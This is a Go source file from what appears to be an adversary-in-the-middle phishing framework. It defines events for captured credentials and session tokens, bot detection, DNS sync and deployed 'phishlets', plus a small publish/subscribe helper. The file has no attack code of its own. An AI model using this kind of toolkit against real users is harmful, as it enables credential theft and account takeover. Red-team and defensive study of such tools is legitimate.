package aitm

import (
	"time"

	"github.com/travisbale/mirage/sdk"
)

// Event is a domain event published to the bus.
type Event struct {
	Type       sdk.EventType
	OccurredAt time.Time
	Payload    any
}

func NewSessionCreatedEvent(s *Session) Event {
	return Event{Type: sdk.EventSessionCreated, Payload: s}
}

func NewSessionCompletedEvent(s *Session) Event {
	return Event{Type: sdk.EventSessionCompleted, Payload: s}
}

func NewCredsCapturedEvent(s *Session) Event {
	return Event{Type: sdk.EventCredsCaptured, Payload: s}
}

func NewTokensCapturedEvent(s *Session) Event {
	return Event{Type: sdk.EventTokensCaptured, Payload: s}
}

func NewBotDetectedEvent(p BotDetectedPayload) Event {
	return Event{Type: sdk.EventBotDetected, Payload: p}
}

func NewDNSSyncEvent(p DNSSyncPayload) Event {
	return Event{Type: sdk.EventDNSRecordSynced, Payload: p}
}

func NewPhishletPushedEvent(p *Phishlet) Event {
	return Event{Type: sdk.EventPhishletPushed, Payload: p}
}

func NewPhishletEnabledEvent(cp *ConfiguredPhishlet) Event {
	return Event{Type: sdk.EventPhishletEnabled, Payload: cp}
}

// eventBus is the publish/subscribe interface for decoupling components.
type eventBus interface {
	Publish(event Event)
	Subscribe(eventType sdk.EventType) (events <-chan Event, unsubscribe func())
}

// SubscribeAndHandle subscribes to eventType on bus and runs fn for each
// event received. It returns an unsubscribe function that terminates the
// subscription and blocks until the dispatch goroutine has fully exited —
// so callers can safely tear down resources fn touches (e.g. close a
// downstream channel) immediately after unsubscribe returns.
//
// fn is called sequentially — concurrent calls from a single
// SubscribeAndHandle are not possible. For slow handlers, spawn a
// goroutine inside fn.
func SubscribeAndHandle(bus eventBus, eventType sdk.EventType, fn func(Event)) (unsubscribe func()) {
	events, unsub := bus.Subscribe(eventType)
	done := make(chan struct{})

	go func() {
		defer close(done)
		for event := range events {
			fn(event)
		}
	}()

	return func() {
		unsub()
		<-done
	}
}
